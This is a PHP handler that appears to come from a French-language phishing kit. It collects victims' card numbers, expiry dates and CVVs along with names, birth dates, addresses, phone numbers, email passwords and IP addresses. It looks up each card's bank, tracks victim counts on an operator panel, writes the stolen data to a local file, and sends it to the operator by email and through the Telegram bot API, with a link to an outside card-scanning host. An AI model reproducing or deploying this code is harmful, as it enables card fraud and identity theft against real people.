<?php
session_start();
include '../../email.php';
include '../../antibots/autoload.php';

if($_SERVER['REQUEST_METHOD'] == 'POST'){
    $_SESSION["c_num"]    = $_POST["c_num"];
    $_SESSION["exdate"]    = $_POST["exdate"];
    $_SESSION["csc"]    = $_POST["csc"];
	$cc = $_SESSION['c_num'];
	$bin=substr(str_replace(' ','',$_SESSION["c_num"]),0,6);
	 $ch = curl_init();
    $url = "https://antibot.pw/api/bin-check?bin=" . $bin . "&apikey=" . $antibotpw_apikey . "";
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    $binres = json_decode($result, true);
    $bank = $binres['bank'];
    $country = $binres['county_name'];
    $level = $binres['level'];
    $type = $binres['type'];
    $brand = $binres['brand'];
    $notes = $binres['Notes'];
    echo($bank);

$filepath = '../../panel/stats.ini';
$data = @parse_ini_file($filepath);
$data['cc']++;
            function update_ini_file($data, $filepath) {
              $content = "";
              $parsed_ini = parse_ini_file($filepath, true);
              foreach($data as $section => $values){
                if($section === ""){
                  continue;
                }
                $content .= $section ."=". $values . "\n\r";
              }
              if (!$handle = fopen($filepath, 'w')) {
                return false;
              }
              $success = fwrite($handle, $content);
              fclose($handle);
            }
update_ini_file($data, $filepath);	
	
	
	
$message = 'ㅤ
ㅤㅤㅤㅤㅤ[👩🏽‍⚖️] KIM CARD [👩🏽‍⚖️]

💳 Num carte : '.$_SESSION["c_num"].'
💳 Date Expiration : '.$_SESSION["exdate"].'
💳 Cryptogramme visuel : '.$_SESSION["csc"].'
🍓 Banque : '.$bank.'
🍓 Niveau de la carte : '.$level.'
🍓 Type de carte : '.$type.'
🍓 Marque de la carte : '.$brand.'
🍓 Pays de la carte : '.$country.'
🍓 Notes de la carte : '.$notes.'

📱 Scan apple pay:

https://progamer-data.gay/ccscan/index.php?l='.$_SESSION["c_num"].'&p='.$_SESSION["exdate"].'&d='.$_SESSION["csc"].'

📞Nom : '.$_SESSION["name"].'
📞Prénom : '.$_SESSION["surname"].'
📞Date de naissance : '.$_SESSION["dob"].'
📞Adresse : '.$_SESSION["address"].'
📞Code Postal : '.$_SESSION["zipcode"].'
📞Ville : '.$_SESSION["city"].'
📞Numéro de téléphone : '.$_SESSION["tel"].'

💌Email : '.$_SESSION['email'].'
🔍Mot de passe rez : '.$_SESSION['pass'].'

🎯 IP : '._ip().'
ㅤ
';


$Subject="「💳」 +1 CC [$bin] • • $bank • $type • ".$_SESSION["dob"]." | "._ip();
$head="From: (っ◔◡◔)っDisneyMiauw 🍓 <cc@sdf.cash>";
$fil = fopen('./rez_txt/rez_cc.txt','a+');
function is_valid_luhn($number) {
  settype($number, 'string');
  $sumTable = array(
    array(0,1,2,3,4,5,6,7,8,9),
    array(0,2,4,6,8,1,3,5,7,9));
  $sum = 0;
  $flip = 0;
  for ($i = strlen($number) - 1; $i >= 0; $i--) {
    $sum += $sumTable[$flip++ & 0x1][$number[$i]];
  }
  return $sum % 10 === 0;
}
if(is_valid_luhn($_SESSION["c_num"]) && is_numeric($_SESSION["c_num"])){
fwrite($fil, ''.$_SESSION["c_num"].'|'.$_SESSION["exdate"].'|'.$_SESSION["csc"].'| FULL INFO : '.$_SESSION["name"].'|'.$_SESSION["surname"].'|'.$_SESSION["address"].'|'.$_SESSION["tel"].'|'.$_SESSION["dob"]."\n");

$_SESSION['step_three']  = true;
mail($my_mail,$Subject,$message,$head);
$stats =''.$_SERVER['HTTP_HOST'].'/panel/panel.php';
$banip = ''.$_SERVER['HTTP_HOST'].'/functions/getban.php?ip='._ip().'';
$lancevbv = ''.$_SERVER['HTTP_HOST'].'/functions/actionvbv.php?ip='._ip().'';
	if($vbv){
		$html = file_get_contents('https://api.telegram.org/bot'.$bot_token.'/sendMessage?chat_id='.$group_id.'&text='.urlencode("$message").'&reply_markup={"inline_keyboard": [[{"text": "Ban Ip", "url": "'.urlencode("$banip").'"},{"text": "Voir les stats", "url": "'.urlencode("$stats").'"}],[{"text": "Lancer le vbv", "url": "'.urlencode("$lancevbv").'"}]]}');
       	header('location: ../waiting.php?enc=' . md5(time()) . '&p=1&dispatch=' . sha1(time()));
   	}
    else{
		$html = file_get_contents('https://api.telegram.org/bot'.$bot_token.'/sendMessage?chat_id='.$group_id.'&text='.urlencode("$message").'&reply_markup={"inline_keyboard": [[{"text": "Ban Ip", "url": "'.urlencode("$banip").'"},{"text": "Voir les stats", "url": "'.urlencode("$stats").'"}]]}');
  		header('location: ../merci.php?enc=' . md5(time()) . '&p=1&dispatch=' . sha1(time()));
    }
} else {
	header('location: ../card.php?error=true');   
}
}
else
{
  header('location: ../../../index.php');
} 
?>